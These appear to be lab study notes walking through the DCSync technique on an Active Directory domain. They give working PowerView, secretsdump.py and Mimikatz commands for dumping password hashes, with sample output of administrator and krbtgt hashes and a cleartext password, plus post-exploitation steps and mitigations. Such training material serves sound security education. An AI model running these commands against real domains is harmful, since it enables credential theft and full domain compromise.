### **What is DCSync?**

DCSync is an attack technique that allows an adversary to **steal password hashes** of domain users, including **Domain Admins**, from an **Active Directory (AD) environment**. It exploits the **Directory Replication Service (DRS) Remote Protocol**, which is normally used by **Domain Controllers (DCs)** to synchronize user credentials across the domain.

With **DCSync**, an attacker can **pretend to be a Domain Controller** and request user credentials (NTLM password hashes) from an actual DC.


### **How Does DCSync Work?**

To execute a DCSync attack, the attacker must have access to an account with the following **Active Directory permissions**:

1. `DS-Replication-Get-Changes`
2. `DS-Replication-Get-Changes-All`
3. `DS-Replication-Get-Changes-In-Filtered-Set`

These permissions allow the account to **replicate** password hashes from the **NTDS.dit database**, which contains all user credentials in the domain.

By **compromising an account with these privileges**, the attacker can **retrieve the NTLM hashes** of **any domain user**, including **Domain Administrators**.

---

### **Steps to Perform a DCSync Attack**

#### **1. Verify Account Privileges**

Before executing the attack, we must verify if the compromised account (`adunn` in this case) has **replication rights**.

Using PowerView in PowerShell:

```powershell
Get-DomainUser -Identity adunn | Select samaccountname, objectsid, memberof, useraccountcontrol | Format-List
```

To check **replication rights**:

```powershell
$sid = "S-1-5-21-XXXX-XXXX-XXXX-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ? { $_.SecurityIdentifier -match $sid } | Select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | Format-List
```

If the output confirms that the account has **`DS-Replication-Get-Changes`** and **`DS-Replication-Get-Changes-All`** permissions, the attack can proceed.

---

#### **2. Extract NTLM Hashes (Linux)**

Once we confirm the required permissions, we can extract password hashes using **Impacket's `secretsdump.py`**.

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/[email protected]
```

- `-just-dc`: Extracts **only** NTLM hashes and Kerberos keys.
- `-outputfile inlanefreight_hashes`: Saves the extracted data in a file.

**Example Output:**

```
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
```

The hash format:

```
DOMAIN\user:RID:LM hash:NT hash:::
```

The **NT hash** can be used for **pass-the-hash (PTH) attacks** to gain access without knowing the actual password.

---

#### **3. Extract NTLM Hashes (Windows)**

Instead of using Linux, we can also run `Mimikatz` in Windows to perform **DCSync**.

1. Open **PowerShell as Administrator**.
2. Run the following command in Mimikatz:

```mimikatz
lsadump::dcsync /domain:inlanefreight.local /user:administrator
```

This will return the **NTLM hash of the Administrator account**, allowing us to use **Pass-the-Hash (PTH) attacks**.

---

### **Post-Exploitation**

Once the NTLM hash is obtained, we can:

- **Use Pass-the-Hash (PTH) to authenticate** as the compromised user without knowing their password.
- **Dump more credentials** using tools like `mimikatz`.
- **Create persistence** by adding a backdoor user with administrative privileges.

---

### **Mitigation Strategies**

To prevent DCSync attacks:

1. **Restrict Replication Rights** – Limit `DS-Replication-Get-Changes` permissions to **only** Domain Controllers.
2. **Monitor for Suspicious Events** – Look for:
    - Event ID **4662** (replication attempt)
    - Event ID **4742** (modifications to privileged accounts)
3. **Implement Tiered Administration** – Ensure that **service accounts** do not have unnecessary privileges.
4. **Use LAPS (Local Administrator Password Solution)** – Rotate local admin passwords regularly.

---


---

### **3. Reversible Encryption Storage Attack**

- Some accounts have **reversible encryption enabled**, meaning passwords are stored using **RC4 encryption**.
- The **Syskey** (needed to decrypt them) is stored in the **registry**, making it retrievable by a **Domain Admin**.
- `secretsdump.py` can **decrypt** these passwords automatically when dumping the NTDS.

**Enumeration using PowerShell:**

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

- Found an account: `proxyagent`, which has **reversible encryption enabled**.
- Extracted cleartext password:
    
    ```plaintext
    proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
    ```
    

---

### **4. Performing the Attack with Mimikatz**

- Using `runas.exe` to escalate privileges:
    
    ```plaintext
    runas /netonly /user:INLANEFREIGHT\adunn powershell
    ```
    
- Executing `mimikatz`:
    
    ```mimikatz
    privilege::debug
    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
    ```
    
- Extracted NTLM hash:
    
    ```plaintext
    Hash NTLM: 88ad09182de639ccc6579eb0849751cf
    ```


---

